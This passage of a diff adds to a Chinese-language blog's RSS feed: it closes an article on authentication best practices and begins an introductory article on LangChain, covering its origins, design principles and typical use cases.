+&lt;li&gt;&lt;strong&gt;合理设置 Token 有效期&lt;/strong&gt;：Access Token 短一些，Refresh Token 可以长一些&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;敏感操作二次验证&lt;/strong&gt;：修改密码、支付等操作建议额外验证&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;做好日志记录&lt;/strong&gt;：登录、登出、异常访问都需要记录&lt;/li&gt;
+&lt;/ol&gt;&lt;p&gt;希望这篇文章能帮助你理解认证方案的区别和适用场景。如果有问题，欢迎讨论！&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;</content:encoded></item><item><title>LangChain的核心以及工作流程思路分析</title><link>https://liushuai-man.github.io/my-blog/posts/langchain-work/</link><guid isPermaLink="true">https://liushuai-man.github.io/my-blog/posts/langchain-work/</guid><description>本文将重点介绍LangChain由哪些核心组成，以及其工作流程思路分析，同时提供一些实战案例与常见问题优化方案。</description><pubDate>Sun, 07 Jun 2026 00:00:00 GMT</pubDate><content:encoded>&lt;section&gt;&lt;h1&gt;一、LangChain简介&lt;a href=&quot;#一langchain简介&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;&lt;section&gt;&lt;h2&gt;1.1 什么是LangChain&lt;a href=&quot;#11-什么是langchain&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;LangChain是一个用于构建基于大语言模型（LLM）应用的开源框架，由Harrison Chase于2022年10月推出。它提供了一整套工具和抽象层，帮助开发者更便捷地将大模型与外部数据源、工具进行整合，构建复杂的AI应用。&lt;/p&gt;&lt;p&gt;LangChain的核心设计理念是”模块化”与”可组合性”——将LLM应用拆分为独立的组件（如提示词模板、记忆模块、工具调用），再通过链式调用将这些组件串联起来，形成完整的工作流程。&lt;/p&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;1.2 LangChain的核心定位与价值&lt;a href=&quot;#12-langchain的核心定位与价值&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;LangChain在AI应用开发中的定位可以归结为以下几点：&lt;/p&gt;&lt;p&gt;&lt;strong&gt;降低开发门槛&lt;/strong&gt;：封装了大模型交互的复杂逻辑，开发者无需关注底层Prompt构建、模型调用、重试机制等细节。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;提供标准接口&lt;/strong&gt;：定义了LLM、Tool、Memory、Retrieval等组件的统一抽象，使得不同服务商（OpenAI、Anthropic、开源模型）的模型可以无缝切换。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;支持复杂工作流&lt;/strong&gt;：通过Chain机制，将多个组件串联成处理复杂任务的流水线，支持RAG、Agent等高级场景。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;生态丰富&lt;/strong&gt;：拥有庞大的社区生态，提供了丰富的预置组件、模板和第三方集成。&lt;/p&gt;&lt;/section&gt;&lt;section&gt;&lt;h2&gt;1.3 LangChain适用场景与优势&lt;a href=&quot;#13-langchain适用场景与优势&quot;&gt;&lt;span&gt;#&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;LangChain适用于以下典型场景：&lt;/p&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;智能问答系统&lt;/strong&gt;：基于企业知识库或私有文档的问答（RAG场景）&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;聊天机器人&lt;/strong&gt;：具备多轮对话能力、上下文记忆的对话系统&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;自动化代理&lt;/strong&gt;：能够自主决策、调用工具完成复杂任务的AI Agent&lt;/li&gt;
